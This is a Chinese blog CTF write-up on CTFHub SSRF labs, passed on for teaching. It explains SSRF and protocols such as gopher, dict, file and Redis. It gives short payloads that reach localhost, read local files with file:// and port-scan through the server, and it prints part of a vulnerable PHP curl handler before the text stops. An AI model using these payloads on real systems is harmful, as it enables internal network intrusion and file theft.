<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>[SSRF]CTFHUB SSRF - Nexuzzz0</title><meta name=Description content="Nexuzzz0's BLOG"><meta property="og:title" content="[SSRF]CTFHUB SSRF">
<meta property="og:description" content="在 CTFHUB SSRF 做题记录"><meta property="og:type" content="article"><meta property="og:url" content="https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/"><meta property="og:image" content="https://nexuzzz0.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-01T21:10:40+08:00"><meta property="article:modified_time" content="2024-02-01T21:10:40+08:00"><meta property="og:site_name" content="Nexuzzz0's BLOG"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://nexuzzz0.github.io/logo.png"><meta name=twitter:title content="[SSRF]CTFHUB SSRF"><meta name=twitter:description content="在 CTFHUB SSRF 做题记录"><meta name=application-name content="Nexuzzz0's BLOG"><meta name=apple-mobile-web-app-title content="Nexuzzz0's BLOG"><meta name=theme-color content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=https://nexuzzz0.github.io/posts/ssrf/ssrfctfhub-ssrf/><link rel=prev href=https://nexuzzz0.github.io/posts/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96pop%E9%93%BE/><link rel=next href=https://nexuzzz0.github.io/posts/php%E7%89%B9%E6%80%A7/php%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/><link rel=stylesheet href=/css/main.css><link rel=stylesheet href=/lib/normalize/normalize.min.css><link rel=stylesheet href=/css/color.css><link rel=stylesheet href=/css/style.min.css><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/fontawesome-free/all.min.css><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload as=style onload='this.onload=null,this.rel="stylesheet"' href=/lib/animate/animate.min.css><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"[SSRF]CTFHUB SSRF","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/nexuzzz0.github.io\/posts\/ssrf\/ssrfctfhub-ssrf\/"},"genre":"posts","keywords":"SSRF","wordcount":7033,"url":"https:\/\/nexuzzz0.github.io\/posts\/ssrf\/ssrfctfhub-ssrf\/","datePublished":"2024-02-01T21:10:40+08:00","dateModified":"2024-02-01T21:10:40+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Nexuzzz0"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>function setTheme(e){document.body.setAttribute("theme",e),document.documentElement.style.setProperty("color-scheme",e==="light"?"light":"dark"),window.theme=e,window.isDark=window.theme!=="light"}function saveTheme(e){window.localStorage&&localStorage.setItem("theme",e)}function getMeta(e){const t=document.getElementsByTagName("meta");for(let n=0;n<t.length;n++)if(t[n].getAttribute("name")===e)return t[n];return""}if(window.localStorage&&localStorage.getItem("theme")){let e=localStorage.getItem("theme");e==="light"||e==="dark"||e==="black"?setTheme(e):setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light")}else"auto"==="light"||"auto"==="dark"||"auto"==="black"?(setTheme("auto"),saveTheme("auto")):(saveTheme("auto"),setTheme(window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light"));let metaColors={light:"#f8f8f8",dark:"#252627",black:"#000000"};getMeta("theme-color").content=metaColors[document.body.getAttribute("theme")],window.switchThemeEventSet=new Set</script><div id=back-to-top></div><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=desktop-header-typeit class=typeit></span></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>文章 </a><a class=menu-item href=/tags/>标签 </a><a class=menu-item href=/categories/>分类 </a><a class=menu-item href=/friend/ title=Friend>友链 </a><a class=menu-item href=/about/ title=About>关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin"></i>
</span></span><a href=javascript:void(0); class="menu-item theme-select" title=切换主题><i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-desktop title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=Nexuzzz0><span id=mobile-header-typeit class=typeit></span></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw"></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw"></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin"></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/ title>文章</a><a class=menu-item href=/tags/ title>标签</a><a class=menu-item href=/categories/ title>分类</a><a class=menu-item href=/friend/ title=Friend>友链</a><a class=menu-item href=/about/ title=About>关于</a><a href=javascript:void(0); class="menu-item theme-select" title=切换主题>
<i class="fas fa-adjust fa-fw"></i>
<select class=color-theme-select id=theme-select-mobile title=切换主题><option value=light>浅色</option><option value=dark>深色</option><option value=black>黑色</option><option value=auto>跟随系统</option></select></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class="toc-content always-active" id=toc-content-auto><nav id=TableOfContents><ul><li><a href=#函数>函数</a></li><li><a href=#类>类</a></li></ul><ul><li><a href=#httphttps协议>http/https协议</a></li><li><a href=#dict协议>dict协议</a></li><li><a href=#file伪协议>file伪协议</a></li><li><a href=#gopher协议>Gopher协议</a></li><li><a href=#fastcgi协议>FastCGI协议</a></li><li><a href=#redis协议>Redis协议</a><ul><li><a href=#resp协议>RESP协议</a></li></ul></li></ul><ul><li><a href=#ctfhub-ssrf-内网访问>CTFHUB SSRF 内网访问</a></li><li><a href=#ctfhub-ssrf-伪协议读取文件>CTFHUB SSRF 伪协议读取文件</a></li><li><a href=#ctfhub-ssrf-端口扫描>CTFHUB SSRF 端口扫描</a></li><li><a href=#ctfhub-ssrf-post请求>CTFHUB SSRF POST请求</a><ul><li><a href=#法1手搓>法1——手搓</a></li><li><a href=#法2脚本>法2——脚本</a></li></ul></li><li><a href=#ctfhub-ssrf-文件上传>CTFHUB SSRF 文件上传</a></li><li><a href=#ctfhub-ssrf-fastcgi协议>CTFHUB SSRF FastCGI协议</a></li><li><a href=#ctfhub-ssrf-redis协议>CTFHUB SSRF Redis协议</a><ul><li><a href=#法1>法1</a></li><li><a href=#法2>法2</a></li></ul></li><li><a href=#ctfhub-ssrf-url-bypass>CTFHUB SSRF <strong>URL Bypass</strong></a></li><li><a href=#ctfhub-ssrf-数字ip-bypass><strong>CTFHUB SSRF 数字IP Bypass</strong></a><ul><li><a href=#利用进制转换>利用进制转换</a></li><li><a href=#利用其他各种指向127001的地址>利用其他各种指向127.0.0.1的地址</a></li></ul></li><li><a href=#ctfhub-ssrf-302跳转-bypass><strong>CTFHUB SSRF 302跳转 Bypass</strong></a></li><li><a href=#ctfhub-ssrf-dns重绑定-bypass><strong>CTFHUB SSRF DNS重绑定 Bypass</strong></a></li></ul></nav></div></div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC","true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[SSRF]CTFHUB SSRF</h1><div class=post-meta><div class=post-meta-line><span class=post-author><span class="author fas fa-user-circle fa-fw"></span><a href=/ title=Author rel=author class=author>Nexuzzz0</a>
</span>&nbsp;<span class=post-category>收录于 </span>&nbsp;<span class=post-category>类别 <a href=/categories/ctf/><i class="far fa-folder fa-fw"></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime=1019-22-12>1019-22-12</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime=1019-22-12>1019-22-12</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 7033 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 15 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
<span><i class="details-icon fas fa-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#函数>函数</a></li><li><a href=#类>类</a></li></ul><ul><li><a href=#httphttps协议>http/https协议</a></li><li><a href=#dict协议>dict协议</a></li><li><a href=#file伪协议>file伪协议</a></li><li><a href=#gopher协议>Gopher协议</a></li><li><a href=#fastcgi协议>FastCGI协议</a></li><li><a href=#redis协议>Redis协议</a><ul><li><a href=#resp协议>RESP协议</a></li></ul></li></ul><ul><li><a href=#ctfhub-ssrf-内网访问>CTFHUB SSRF 内网访问</a></li><li><a href=#ctfhub-ssrf-伪协议读取文件>CTFHUB SSRF 伪协议读取文件</a></li><li><a href=#ctfhub-ssrf-端口扫描>CTFHUB SSRF 端口扫描</a></li><li><a href=#ctfhub-ssrf-post请求>CTFHUB SSRF POST请求</a><ul><li><a href=#法1手搓>法1——手搓</a></li><li><a href=#法2脚本>法2——脚本</a></li></ul></li><li><a href=#ctfhub-ssrf-文件上传>CTFHUB SSRF 文件上传</a></li><li><a href=#ctfhub-ssrf-fastcgi协议>CTFHUB SSRF FastCGI协议</a></li><li><a href=#ctfhub-ssrf-redis协议>CTFHUB SSRF Redis协议</a><ul><li><a href=#法1>法1</a></li><li><a href=#法2>法2</a></li></ul></li><li><a href=#ctfhub-ssrf-url-bypass>CTFHUB SSRF <strong>URL Bypass</strong></a></li><li><a href=#ctfhub-ssrf-数字ip-bypass><strong>CTFHUB SSRF 数字IP Bypass</strong></a><ul><li><a href=#利用进制转换>利用进制转换</a></li><li><a href=#利用其他各种指向127001的地址>利用其他各种指向127.0.0.1的地址</a></li></ul></li><li><a href=#ctfhub-ssrf-302跳转-bypass><strong>CTFHUB SSRF 302跳转 Bypass</strong></a></li><li><a href=#ctfhub-ssrf-dns重绑定-bypass><strong>CTFHUB SSRF DNS重绑定 Bypass</strong></a></li></ul></nav></div></div><div class=content id=content><p>在 CTFHUB SSRF 做题记录</p><h1 id=ssrf class=headerLink><a href=#ssrf class=header-mark></a>SSRF</h1><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg title=4b616e312e927ef43e6657a9e4bc15d3_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122679.jpg 2x" sizes=auto alt=4b616e312e927ef43e6657a9e4bc15d3_MD5></a></figure></p><p>SSRF (Server-Side Request Forgery，服务器端请求伪造)由于<strong>服务端</strong>提供了从其他服务器应用获取数据的功能，但又没有对目标地址做严格过滤与限制，导致攻击者可以<strong>传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。</strong></p><p>一般情况下，SSRF针对的都是一些外网无法访问的<strong>内网</strong>，所以需要SSRF使目标后端去访问内网，进而达到我们攻击内网的目的。</p><p>通过SSRF，我们可以访问目标内网的redis服务，mysql服务，smpt服务，fastcgi服务等</p><h1 id=ssrf漏洞相关函数和类 class=headerLink><a href=#ssrf%e6%bc%8f%e6%b4%9e%e7%9b%b8%e5%85%b3%e5%87%bd%e6%95%b0%e5%92%8c%e7%b1%bb class=header-mark></a>SSRF漏洞相关函数和类</h1><h2 id=函数 class=headerLink><a href=#%e5%87%bd%e6%95%b0 class=header-mark></a>函数</h2><ul><li><code>file_get_contents()</code>：将整个文件或一个 url 所指向的文件读入一个字符串中。</li><li><code>readfile()</code>：输出一个文件的内容。</li><li><code>fsockopen()</code>：打开一个网络连接或者一个 Unix 套接字连接。</li><li><code>curl_exec()</code>：初始化一个新的会话，返回一个 cURL 句柄，供<code>curl_setopt()</code>，<code>curl_exec()</code>和<code>curl_close()</code>函数使用。</li><li><code>fopen()</code>：打开一个文件文件或者 URL。</li></ul><h2 id=类 class=headerLink><a href=#%e7%b1%bb class=header-mark></a>类</h2><h1 id=ssrf攻击涉及的协议 class=headerLink><a href=#ssrf%e6%94%bb%e5%87%bb%e6%b6%89%e5%8f%8a%e7%9a%84%e5%8d%8f%e8%ae%ae class=header-mark></a>SSRF攻击涉及的协议</h1><h2 id=httphttps协议 class=headerLink><a href=#httphttps%e5%8d%8f%e8%ae%ae class=header-mark></a>http/https协议</h2><p>探测内网主机存活</p><h2 id=dict协议 class=headerLink><a href=#dict%e5%8d%8f%e8%ae%ae class=header-mark></a>dict协议</h2><p>泄露安装软件版本信息，查看端口，操作内网redis服务等，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p><h2 id=file伪协议 class=headerLink><a href=#file%e4%bc%aa%e5%8d%8f%e8%ae%ae class=header-mark></a>file伪协议</h2><p>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。</p><h2 id=gopher协议 class=headerLink><a href=#gopher%e5%8d%8f%e8%ae%ae class=header-mark></a>Gopher协议</h2><p>gopher支持发出GET、POST请求，也可用于反弹 shell 。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)，利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等。</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg title=d09bd0c75b4193b5b8de7258c27fda38_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122680.jpg 2x" sizes=auto alt=d09bd0c75b4193b5b8de7258c27fda38_MD5></a></figure></p><h2 id=fastcgi协议 class=headerLink><a href=#fastcgi%e5%8d%8f%e8%ae%ae class=header-mark></a>FastCGI协议</h2><h2 id=redis协议 class=headerLink><a href=#redis%e5%8d%8f%e8%ae%ae class=header-mark></a>Redis协议</h2><h3 id=resp协议 class=headerLink><a href=#resp%e5%8d%8f%e8%ae%ae class=header-mark></a>RESP协议</h3><p>Redis 服务器与客户端通过 RESP（REdis Serialization Protocol）协议通信。<br>RESP 协议是在 Redis 1.2 中引入的，但它成为了与 Redis 2.0 中的 Redis 服务器通信的标准方式。这是您应该在Redis客户端中实现的协议。<br>RESP实际上是一个支持以下数据类型的序列化协议：简单字符串，错误，整数，批量字符串和数组。</p><p>RESP在Redis中用作请求 - 响应协议的方式如下：</p><ol><li>客户端将命令作为Bulk Strings的RESP数组发送到Redis服务器。</li><li>服务器根据命令实现回复一种RESP类型。</li></ol><p>:::tips
在RESP中，某些数据的类型取决于第一个字节：<br>对于Simple Strings，回复的第一个字节是+<br>对于error，回复的第一个字节是-<br>对于Integer，回复的第一个字节是:<br>对于Bulk Strings，回复的第一个字节是$<br>对于array，回复的第一个字节是*<br>此外，RESP能够使用稍后指定的Bulk Strings或Array的特殊变体来表示Null值。<br>在RESP中，协议的不同部分始终以"\r\n"(CRLF)结束。</p><p>:::</p><h1 id=ctfhub-ssrf class=headerLink><a href=#ctfhub-ssrf class=header-mark></a>CTFHUB SSRF</h1><h2 id=ctfhub-ssrf-内网访问 class=headerLink><a href=#ctfhub-ssrf-%e5%86%85%e7%bd%91%e8%ae%bf%e9%97%ae class=header-mark></a>CTFHUB SSRF 内网访问</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg title=957ef62a4b8c9db3ec18948f068c5a28_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122681.jpg 2x" sizes=auto alt=957ef62a4b8c9db3ec18948f068c5a28_MD5></a></figure></p><p>看到这样的url下意识想到ssrf，既然是让我们从目标主机内网环境访问其本地的<code>flag.php</code>，构造<strong>payload：</strong></p><p><code>?url=http://127.0.0.1/flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg title=93b0a84a52ff5d24ea8e43587b211b46_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122682.jpg 2x" sizes=auto alt=93b0a84a52ff5d24ea8e43587b211b46_MD5></a></figure></p><p>这就是因为过滤不严谨，导致我们可以直接访问内网</p><h2 id=ctfhub-ssrf-伪协议读取文件 class=headerLink><a href=#ctfhub-ssrf-%e4%bc%aa%e5%8d%8f%e8%ae%ae%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6 class=header-mark></a>CTFHUB SSRF 伪协议读取文件</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg title=ce6ffd3c1eba16d233d132589b1e016a_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122683.jpg 2x" sizes=auto alt=ce6ffd3c1eba16d233d132589b1e016a_MD5></a></figure></p><p>直接访问<code>?url=http://127.0.0.1/flag.php</code>不能访问</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg title=da79d79ee2d792f723a4e418a3701368_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122684.jpg 2x" sizes=auto alt=da79d79ee2d792f723a4e418a3701368_MD5></a></figure></p><p>尝试用<code>file://</code>伪协议读取，<strong>payload：</strong></p><p><code>/?url=file:///var/www/html/flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg title=d67450f4b50fdd67faba3968209dbe28_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122685.jpg 2x" sizes=auto alt=d67450f4b50fdd67faba3968209dbe28_MD5></a></figure></p><h2 id=ctfhub-ssrf-端口扫描 class=headerLink><a href=#ctfhub-ssrf-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f class=header-mark></a>CTFHUB SSRF 端口扫描</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg title=d8d86a800a4290765789c8a82561bdaa_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122686.jpg 2x" sizes=auto alt=d8d86a800a4290765789c8a82561bdaa_MD5></a></figure></p><p>既然告诉了我们是内网端口扫描，那我们就要利用ssrf漏洞探测目标主机上还开放了哪些端口。在SSRF中，dict协议与http协议可用来探测内网的主机存活与端口开放情况。</p><p>这里的端口扫描我们用burpsuite抓包，发送到Intruder进行爆破设置：</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg title=931c65d682635048fd2542dd2561399f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122687.jpg 2x" sizes=auto alt=931c65d682635048fd2542dd2561399f_MD5></a></figure></p><p>设置类型为** Numbers **，From <strong>8000</strong> To <strong>9000</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg title=cd1ebd70b9198039996bac5632d61c6f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122688.jpg 2x" sizes=auto alt=cd1ebd70b9198039996bac5632d61c6f_MD5></a></figure></p><p>爆破查找不同的长度</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg title=8efe3bff2302b507307b5e277c11660e_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122689.jpg 2x" sizes=auto alt=8efe3bff2302b507307b5e277c11660e_MD5></a></figure></p><p>最终在8896端口发现Apache的web服务，我门再利用ssrf加http协议访问目标主机的8896端口即可得到flag，<strong>payload：</strong></p><p><code>?url=[http://127.0.0.1:8896](http://127.0.0.1:8896)</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg title=453af1f1275e753552770c33a3a036fb_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122690.jpg 2x" sizes=auto alt=453af1f1275e753552770c33a3a036fb_MD5></a></figure></p><h2 id=ctfhub-ssrf-post请求 class=headerLink><a href=#ctfhub-ssrf-post%e8%af%b7%e6%b1%82 class=header-mark></a>CTFHUB SSRF POST请求</h2><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg title=cac894aefbec5aacadbb359593438366_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122691.jpg 2x" sizes=auto alt=cac894aefbec5aacadbb359593438366_MD5></a></figure></p><p>进行目录扫描，发现了<code>index.php</code>和<code>flag.php</code>（<code>302.php</code>被删了，因为<code>302.php</code>里面是个302跳转，多余了没有必要），先读一下<code>index.php</code>和<code>flag.php</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg title=5750045d9951dddd3fba9c360658b3d3_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152122692.jpg 2x" sizes=auto alt=5750045d9951dddd3fba9c360658b3d3_MD5></a></figure></p><p><code>?url=file:/var/www/html/index.php</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>&lt;?php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>error_reporting(0);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>if (!isset($_REQUEST[&#39;url&#39;])){
</span></span><span class=line><span class=cl>    header(&#34;Location: /?url=_&#34;);
</span></span><span class=line><span class=cl>    exit;
</span></span><span class=line><span class=cl>}
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ch = curl_init();   //初始化一个cURL对话
</span></span><span class=line><span class=cl>curl_setopt($ch, CURLOPT_URL, $_REQUEST[&#39;url&#39;]);  //设置cURL会话的目标URL，URL由用户请求中的&#34;url&#34;参数提供。
</span></span><span class=line><span class=cl>curl_setopt($ch, CURLOPT_HEADER, 0);   //设置cURL是否包括头信息。在这里，它被设置为0，表示不包括头信息。
